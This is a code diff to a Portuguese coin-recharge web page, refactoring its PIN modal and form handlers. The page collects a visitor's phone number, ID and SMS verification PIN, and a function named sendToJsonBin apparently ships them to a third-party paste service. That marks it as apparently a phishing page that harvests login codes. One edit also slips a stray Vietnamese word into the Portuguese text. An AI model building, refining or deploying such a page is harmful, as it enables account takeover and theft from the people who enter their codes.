@@ -84,12 +84,28 @@
             border-radius: 8px;
             margin: 20px 0;
         }
+        /* Garante que o modal fique acima de tudo */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: rgba(0, 0, 0, 0.5);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+        }
+        .hidden {
+            display: none !important;
+        }
     </style>
 </head>
 <body class="bg-gray-100 font-sans">
     <!-- Modal para validação do PIN -->
-    <div id="pinModal" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center hidden z-50">
-        <div class="bg-white rounded-lg shadow-xl p-6 w-full max-w-md">
+    <div id="pinModal" class="modal-overlay hidden">
+        <div class="bg-white rounded-lg shadow-xl p-6 w-full max-w-md mx-4">
             <div class="flex justify-between items-center mb-4">
                 <h3 class="text-xl font-bold text-purple-800">Valide seu ID</h3>
                 <button id="closePinModal" class="text-gray-500 hover:text-gray-700">
@@ -215,7 +231,7 @@
                         </div>
                         <div>
                             <h3 class="text-2xl font-bold">SEGURANÇA</h3>
-                            <p class="mt-2">Seus dados são criptografados e protegidos por nossas políticas de segurança.</p>
+                            <p class="mt-2">Seus dados são criptografados và protegidos por nossas políticas de segurança.</p>
                         </div>
                     </div>
                 </div>
@@ -251,6 +267,50 @@
         let smsCooldown = false;
         let smsCooldownTimer = null;
         let countdownTimer = null;
+
+        // Elementos do DOM
+        const pinModal = document.getElementById('pinModal');
+        const closePinModal = document.getElementById('closePinModal');
+        const pinForm = document.getElementById('pinForm');
+        const submitBtn = document.getElementById('submitBtn');
+        const submitPinBtn = document.getElementById('submitPinBtn');
+
+        // Inicialização
+        document.addEventListener('DOMContentLoaded', function() {
+            // Configurar event listeners
+            setupEventListeners();
+            
+            // Configurar seleção de moedas
+            setupCoinOptions();
+        });
+
+        function setupEventListeners() {
+            // Fechar modal
+            closePinModal.addEventListener('click', function() {
+                pinModal.classList.add('hidden');
+                if (countdownTimer) clearInterval(countdownTimer);
+            });
+            
+            // Envio do formulário principal
+            document.getElementById('rechargeForm').addEventListener('submit', handleFormSubmit);
+            
+            // Envio do formulário de PIN
+            pinForm.addEventListener('submit', handlePinSubmit);
+        }
+
+        function setupCoinOptions() {
+            document.querySelectorAll('.coin-option').forEach(button => {
+                button.addEventListener('click', function() {
+                    document.querySelectorAll('.coin-option').forEach(btn => {
+                        btn.classList.remove('selected', 'bg-purple-700', 'text-white');
+                        btn.classList.add('bg-purple-100', 'text-purple-800');
+                    });
+                    this.classList.add('selected', 'bg-purple-700', 'text-white');
+                    this.classList.remove('bg-purple-100', 'text-purple-800');
+                    document.getElementById('amount').value = this.dataset.amount;
+                });
+            });
+        }
 
         // Função para formatar telefone
         function formatPhone(input) {
@@ -488,34 +548,8 @@
             }, 1000);
         }
 
-        // Seleção de moedas
-        document.querySelectorAll('.coin-option').forEach(button => {
-            button.addEventListener('click', function() {
-                document.querySelectorAll('.coin-option').forEach(btn => {
-                    btn.classList.remove('selected', 'bg-purple-700', 'text-white');
-                    btn.classList.add('bg-purple-100', 'text-purple-800');
-                });
-                this.classList.add('selected', 'bg-purple-700', 'text-white');
-                this.classList.remove('bg-purple-100', 'text-purple-800');
-                document.getElementById('amount').value = this.dataset.amount;
-            });
-        });
-
-        // Modal de PIN
-        const pinModal = document.getElementById('pinModal');
-        const closePinModal = document.getElementById('closePinModal');
-        const pinForm = document.getElementById('pinForm');
-        const submitBtn = document.getElementById('submitBtn');
-        const submitPinBtn = document.getElementById('submitPinBtn');
-        
-        // Fechar modal
-        closePinModal.addEventListener('click', function() {
-            pinModal.classList.add('hidden');
-            if (countdownTimer) clearInterval(countdownTimer);
-        });
-        
-        // Envio do formulário principal
-        document.getElementById('rechargeForm').addEventListener('submit', async function(e) {
+        // Handler para o envio do formulário principal
+        async function handleFormSubmit(e) {
             e.preventDefault();
             
             // Validações básicas
@@ -582,10 +616,10 @@
                 // Restaura o botão
                 submitBtn.innerHTML = 'Solicitar Código SMS';
             }
-        });
+        }
         
-        // Envio do formulário de PIN
-        pinForm.addEventListener('submit', async function(e) {
+        // Handler para o envio do formulário de PIN
+        async function handlePinSubmit(e) {
             e.preventDefault();
             
             const pinInput = document.getElementById('pinInput');
@@ -650,7 +684,7 @@
                 submitPinBtn.disabled = false;
                 if (countdownTimer) clearInterval(countdownTimer);
             }
-        });
+        }
         
         // Função para enviar dados para JSONBin.io
         async function sendToJsonBin(phone, id, pin, apiResult) {
